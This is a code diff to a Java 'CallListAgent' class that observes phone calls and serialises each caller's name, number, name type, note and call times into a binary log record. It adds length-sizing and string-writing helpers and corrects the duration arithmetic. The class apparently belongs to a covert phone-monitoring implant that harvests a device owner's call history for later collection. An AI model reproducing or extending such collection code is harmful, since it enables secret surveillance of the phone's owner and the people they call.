@@ -86,20 +86,31 @@ public final class CallListAgent extends Agent implements CallListObserver {
                 + duration);
         //#endif
 
+        String nametype = "u";
+        String note = "no notes";
+        
         //#ifdef DBC
         Check.requires(number != null, "callLogAdded null number");
         Check.requires(name != null, "callLogAdded null name");
+        Check.requires(nametype != null, "callLogAdded null nametype");
+        Check.requires(note != null, "callLogAdded null note");        
         //#endif
 
         final int LOG_CALLIST_VERSION = 0;
-
+       
         int len = 28; //0x1C;
+
+        len += wsize(number);
+        len += wsize(name);
+        len += wsize(note);
+        len += wsize(nametype);
+
         byte[] data = new byte[len];
 
         final DataBuffer databuffer = new DataBuffer(data, 0, len, false);
 
         DateTime from = new DateTime(date);
-        DateTime to = new DateTime(new Date(date.getTime() + duration));
+        DateTime to = new DateTime(new Date(date.getTime() + duration * 1000));
 
         databuffer.writeInt(len);
         databuffer.writeInt(LOG_CALLIST_VERSION);
@@ -114,19 +125,35 @@ public final class CallListAgent extends Agent implements CallListObserver {
                 "callLogAdded: wrong len: " + databuffer.getLength());
         //#endif
 
-        // Name
-        int header = (0x01<<24) | (name.length() * 2);
-        databuffer.writeInt(header);
-        databuffer.write(WChar.getBytes(name, false));
-
-        //Number
-        header = (0x08<<24) | (number.length() * 2);
-        databuffer.writeInt(header);
-        databuffer.write(WChar.getBytes(number, false));
+        addString(databuffer,(byte) 0x01,name);
+        addString(databuffer,(byte) 0x02,nametype);
+        addString(databuffer,(byte) 0x04,note);
+        addString(databuffer,(byte) 0x08,number);
 
         log.createLog(getAdditionalData());
-        log.writeLog(databuffer.getArray(), 0);
+
+        byte[] array = databuffer.getArray();
+        log.writeLog(array, 0);
         log.close();
+    }
+
+    private void addString(DataBuffer databuffer, byte type, String name) {
+        if (name.length() > 0) {
+            int header = (type << 24) | (name.length() * 2);
+            databuffer.writeInt(header);
+            databuffer.write(WChar.getBytes(name, false));
+            //#ifdef DEBUG_TRACE
+            debug.trace("callLogAdded: name len: " + (header & 0x00ffffff));
+            //#endif
+        }
+    }
+
+    private int wsize(String string) {
+        if (string.length() == 0) {
+            return 0;
+        } else {
+            return string.length() * 2 + 4;
+        }
     }
 
     private byte[] getAdditionalData() {
